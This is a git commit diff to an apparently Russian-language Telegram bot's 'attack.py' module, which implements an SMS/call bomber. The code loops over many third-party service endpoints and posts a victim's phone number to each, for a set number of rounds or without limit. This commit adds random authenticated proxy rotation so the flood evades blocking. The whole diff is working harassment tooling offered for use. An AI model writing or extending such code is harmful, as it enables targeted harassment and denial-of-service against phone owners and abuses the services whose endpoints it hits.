da152f79d0ace34f8d1ab77b0f1d55ad38d92d2b
amtp1 <magomedov.abdul20012@gmail.com>
2022-01-15 17:04:27 +0300

    add proxy

--- bot/utils/attack.py
+++ bot/utils/attack.py
@@ -1,9 +1,10 @@
 from json import loads
 from asyncio import sleep
+from random import choice
 
 from pathlib import Path
-import traceback
-from aiohttp import ClientSession
+from aiohttp import ClientSession, BasicAuth
+from aiohttp.client_exceptions import ClientHttpProxyError
 
 import yaml
 from loguru import logger
@@ -11,7 +12,7 @@ from aiogram.types import Message
 from objects.globals import bot
 from models.models import *
 
-SERVICES_DIR = Path(__file__).resolve().parent.parent.parent
+SERVICES_DIR = PROXIES_DIR = Path(__file__).resolve().parent.parent.parent
 
 class Phone:
     user_id: int
@@ -23,7 +24,7 @@ class Phone:
         self.phone = phone
         self.count_circles: str = None
         self.bomber_data: BomberData = None
-        self.session: ClientSession = ClientSession()
+        self.session: ClientSession = None # ClientSession()
         self.headers = {"User-Agent": (
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -40,6 +41,22 @@ class Phone:
             logger.info("Services loaded!")
             return services
 
+    def load_proxies(self):
+        PROXIES = r"%s/proxies.yaml" % PROXIES_DIR
+        if not Path(PROXIES).exists():
+            logger.error("Proxies file does not exists!")
+        else:
+            with open(PROXIES) as f:
+                proxies = yaml.load(f, Loader=yaml.FullLoader)
+            logger.info("Proxies laoded!")
+            return proxies["PROXIES"]
+
+    def proxy_format(self, proxy: str):
+        proxy_split = proxy.split("@")
+        url = proxy_split[0]
+        username, password = proxy_split[1].split(":")
+        return {"url": f"http://{url}", "username": username, "password": password}
+
     async def start(self, message: Message):
         self.bomber_data = await BomberData.objects.get(username=str(self.user_id))
         self.count_circles = self.bomber_data.circles
@@ -47,16 +64,24 @@ class Phone:
         logger.info("Attack started -> %s" % (self.user_id,))
         try:
             while self.is_process:
-                for k,v in self.services.items():
-                    if not v["formating"]:
-                        if "data" in v:
-                            data = (v["data"] % self.phone[-10:]).replace("'", "\"")
-                            await self.session.post(url=k, data=loads(data), headers=self.headers, timeout=3)
-                        elif "json" in v:
-                            json = (v["json"] % self.phone[-10:]).replace("'", "\"")
-                            await self.session.post(url=k, json=loads(json), headers=self.headers, timeout=3)
-                    else:
-                        await self.session.post(url=k % self.phone, timeout=3)
+                proxy = self.proxy_format(choice(self.load_proxies()))
+                async with ClientSession() as self.session:
+                    proxy_auth = BasicAuth(proxy["username"], proxy["password"])
+                    for k,v in self.services.items():
+                        if not v["formating"]:
+                            if "data" in v:
+                                data = (v["data"] % self.phone[-10:]).replace("'", "\"")
+                                await self.session.post(url=k, data=loads(data),
+                                    headers=self.headers, timeout=3,
+                                    proxy=proxy["url"], proxy_auth=proxy_auth)
+                            elif "json" in v:
+                                json = (v["json"] % self.phone[-10:]).replace("'", "\"")
+                                await self.session.post(url=k, json=loads(json),
+                                    headers=self.headers, timeout=3,
+                                    proxy=proxy["url"], proxy_auth=proxy_auth)
+                        else:
+                            await self.session.post(url=k % self.phone, timeout=3,
+                                proxy=proxy["url"], proxy_auth=proxy_auth)
 
                 if self.count_circles!="∞":
                     self.count_circles = int(self.count_circles) - 1
@@ -64,13 +89,19 @@ class Phone:
                         await self.bomber_data.update(circles=self.count_circles)
                         return await message.answer(text="❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
                 await sleep(3)
+        except ClientHttpProxyError as e:
+            proxy = f"%s@%s:%s" % (proxy["url"], proxy["username"], proxy["password"],)
+            logger.error(f"Proxy: {proxy}, , Error message -> {e}")
         except Exception as e:
-            if e.__class__.__name__ != "TimeoutError":
-                logger.error(e)
+            logger.error(e.args[0])
+            error_name = e.__class__.__name__
+            if error_name != "TimeoutError":
                 await self.session.close()
                 await self.bomber_data.update(circles=str(self.count_circles))
                 return await bot.edit_message_text(chat_id=message.from_user.id, message_id=message.message_id+1,
-                                    text=f"<b><i>Error message</i></b>: {e}")
+                                    text=f"<b><i>Error message</i></b>: {e.args[0]}")
+            else:
+                await self.session.close()
 
     async def stop(self):
         self.is_process = False
